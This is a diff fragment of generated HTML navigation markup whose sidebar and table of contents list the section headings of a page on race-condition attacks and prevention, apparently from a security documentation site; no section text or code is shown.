+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race to Bypass
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race to Bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TL;DR
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http2-single-packet-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP/2 Single-Packet Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP/2 Single-Packet Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How It Works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#benchmark-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Benchmark Results
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#turbo-intruder-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Turbo Intruder Scripts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Turbo Intruder Scripts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-single-packet-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Single-Packet Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multi-endpoint-race-payment-add-item" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Multi-Endpoint Race (Payment + Add Item)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-reset-token-race" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password Reset Token Race
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http11-fallback-last-byte-sync" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP/1.1 Fallback (Last-Byte Sync)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-1-limit-overrun-coupondiscount-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 1: Limit Overrun — Coupon/Discount Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 1: Limit Overrun — Coupon/Discount Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#real-world-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Real-World Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#burp-suite-repeater-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Burp Suite Repeater Method
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-2-balance-manipulation-double-spend" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 2: Balance Manipulation — Double-Spend
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 2: Balance Manipulation — Double-Spend">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Scenario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#turbo-intruder-script" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Turbo Intruder Script
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#financial-platform-variations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Financial Platform Variations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-3-state-confusion-password-reset-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 3: State Confusion — Password Reset Takeover
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 3: State Confusion — Password Reset Takeover">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern-deviserails-common-issue" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern (Devise/Rails common issue)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-script" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Script
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-4-2fa-bypass-via-race-window" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 4: 2FA Bypass via Race Window
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 4: 2FA Bypass via Race Window">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reported-bounties" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reported Bounties
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-5-email-verification-swap-gitlab-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 5: Email Verification Swap (GitLab Vulnerability)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 5: Email Verification Swap (GitLab Vulnerability)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proof of Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-6-partial-construction-race" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 6: Partial Construction Race
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 6: Partial Construction Race">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-on-rails-version" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ruby on Rails Version
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-7-rate-limit-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 7: Rate Limit Bypass
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 7: Rate Limit Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-8-oauth-refresh-token-race" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 8: OAuth Refresh Token Race
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 8: OAuth Refresh Token Race">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#python-alternative-no-burp-suite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python Alternative (No Burp Suite)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Python Alternative (No Burp Suite)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-httpx-asyncio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using httpx + asyncio
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-h2spacex-true-single-packet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using h2spacex (True Single-Packet)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Methodology
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection Methodology">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-identify-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Identify Targets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-benchmark-normal-behavior" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Benchmark Normal Behavior
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-send-parallel-requests" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Send Parallel Requests
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-look-for-clues" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Look for Clues
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-based-locking-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session-Based Locking Bypass
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session-Based Locking Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#real-bug-bounty-reports" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Real Bug Bounty Reports
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prevention
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prevention">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-database-level-locking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Database-Level Locking
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-idempotency-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Idempotency Keys
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-atomic-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Atomic Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-request-serialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Request Serialization
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-cryptographic-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Cryptographic Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact-scoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Impact Scoring
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#poc-report-template" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PoC Report Template
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../self-xss-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Self-XSS Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../frameworks/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Frameworks
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏷️ Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TL;DR
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http2-single-packet-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP/2 Single-Packet Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP/2 Single-Packet Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How It Works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#benchmark-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Benchmark Results
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#turbo-intruder-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Turbo Intruder Scripts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Turbo Intruder Scripts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-single-packet-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Single-Packet Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multi-endpoint-race-payment-add-item" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Multi-Endpoint Race (Payment + Add Item)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-reset-token-race" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password Reset Token Race
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http11-fallback-last-byte-sync" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP/1.1 Fallback (Last-Byte Sync)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-1-limit-overrun-coupondiscount-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 1: Limit Overrun — Coupon/Discount Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 1: Limit Overrun — Coupon/Discount Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#real-world-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Real-World Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#burp-suite-repeater-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Burp Suite Repeater Method
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-2-balance-manipulation-double-spend" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 2: Balance Manipulation — Double-Spend
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 2: Balance Manipulation — Double-Spend">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Scenario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#turbo-intruder-script" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Turbo Intruder Script
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#financial-platform-variations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Financial Platform Variations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-3-state-confusion-password-reset-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 3: State Confusion — Password Reset Takeover
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 3: State Confusion — Password Reset Takeover">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern-deviserails-common-issue" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern (Devise/Rails common issue)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-script" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Script
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-4-2fa-bypass-via-race-window" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 4: 2FA Bypass via Race Window
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 4: 2FA Bypass via Race Window">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reported-bounties" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reported Bounties
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-5-email-verification-swap-gitlab-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 5: Email Verification Swap (GitLab Vulnerability)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 5: Email Verification Swap (GitLab Vulnerability)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proof of Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-6-partial-construction-race" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 6: Partial Construction Race
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 6: Partial Construction Race">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-pattern_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerable Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-on-rails-version" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ruby on Rails Version
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-7-rate-limit-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 7: Rate Limit Bypass
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 7: Rate Limit Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-8-oauth-refresh-token-race" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chain 8: OAuth Refresh Token Race
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Chain 8: OAuth Refresh Token Race">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#python-alternative-no-burp-suite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python Alternative (No Burp Suite)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Python Alternative (No Burp Suite)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-httpx-asyncio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using httpx + asyncio
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-h2spacex-true-single-packet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using h2spacex (True Single-Packet)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Methodology
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection Methodology">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-identify-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Identify Targets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-benchmark-normal-behavior" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Benchmark Normal Behavior
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-send-parallel-requests" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Send Parallel Requests
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-look-for-clues" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Look for Clues
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-based-locking-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session-Based Locking Bypass
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session-Based Locking Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#real-bug-bounty-reports" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Real Bug Bounty Reports
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prevention
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prevention">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-database-level-locking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Database-Level Locking
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-idempotency-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Idempotency Keys
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-atomic-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Atomic Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-request-serialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Request Serialization
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-cryptographic-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Cryptographic Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact-scoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Impact Scoring
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
